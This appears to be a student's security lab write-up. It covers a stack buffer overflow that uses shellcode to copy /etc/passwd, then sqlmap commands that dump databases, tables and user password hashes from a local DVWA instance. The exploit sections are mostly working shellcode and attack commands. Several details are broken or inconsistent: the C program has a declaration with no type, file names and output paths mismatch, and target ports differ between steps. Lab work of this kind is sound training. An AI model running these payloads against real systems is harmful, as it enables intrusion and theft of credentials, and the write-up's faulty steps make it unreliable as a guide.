# Lab #1,22110015, Nguyen Manh Cuong, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:

## 1.Create a Vulnerable C Program

```bash
nano redundant_code.c
```
![image](https://github.com/user-attachments/assets/2e434b7b-7ddf-4675-8e55-54fbc71d3579)

Create a C program that contains a buffer overflow vulnerability

## 2.  Compile the C Program

```bash
gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
```

## 3. Create the Assembly Payload

* Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Here’s the assembly code

```bash
nano asm_code.c
```
![image](https://github.com/user-attachments/assets/d431ef63-ede5-4b1c-ad05-3e1ba676f77f)

## 4. Compile the Assembly Code 

* Save the assembly code in a file named asm_code.asm, and then assemble and link it:

```bash
nasm -f elf32 -o asm_code.o asm_code.asm
ld -m elf_i386 -o asm_code asm_code.o
```

## 5. Load redundant_code  to gdb

```bash
gdb ./redundant_code
```
You need to find the address of the `redundant_code` binary in memory. This address will be used in the exploit string to redirect execution to the payload. To do this, you can use a debugger like `gdb`:
## 6. Finding the Address of the Payload


```bash
 break redundant_code
run $(python -c "print('A'*72)")
p &buffer
```

![image](https://github.com/user-attachments/assets/1c2622c2-8880-49e1-8d64-32e16e20a848)


Inside `gdb`, set a breakpoint in the `redundant_code`, run the program with a dummy argument, and find the address of your payload. This will typically be after the buffer size.

Make a note of the address is `0xf7fcc5b4`; you'll use it in the next step.

## 7. Execute the Vulnerable Program with the Payload




Run the vulnerable program with the crafted payload:

```bash
./redundant_code "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
```


## 8. Verify the Output

```bash
cat /etc/outfile
```

![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)


![image](https://github.com/user-attachments/assets/56fa25ea-0a95-44ba-a009-1a78bd406e6a)






**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
1.  Pull the DVWA Docker image
```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```
![image](https://github.com/user-attachments/assets/54f77e65-1050-4959-aac1-4685fc0c55b7)

2. Access DVWA
Open a web browser and go to: http://localhost
Log in with the default credentials:

Username: admin
Password: password

![image](https://github.com/user-attachments/assets/0a765301-2d1b-44b7-a8ef-5b020f4ce2d9)

3. Install SQLMap in WSL

```bash
wsl
sudo apt install sqlmap
```

4. Fetch the url of webiste you want to attack

![image](https://github.com/user-attachments/assets/7990b9c9-d27f-4129-be3f-03c756477149)


Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=1`

5. Get information about all available databases

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --dbs
```

![image](https://github.com/user-attachments/assets/0a9fd479-4d89-43ba-9f3a-56db673d3400)


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

## 1. Choice Database is dvwa and Use sqlmap to get table 

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
```

![image](https://github.com/user-attachments/assets/13a09125-e859-4705-8e9c-50f30622f3be)

## 2. Choice Database is Users and  use sqlmap to get  users information


```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
```

![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)





**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:



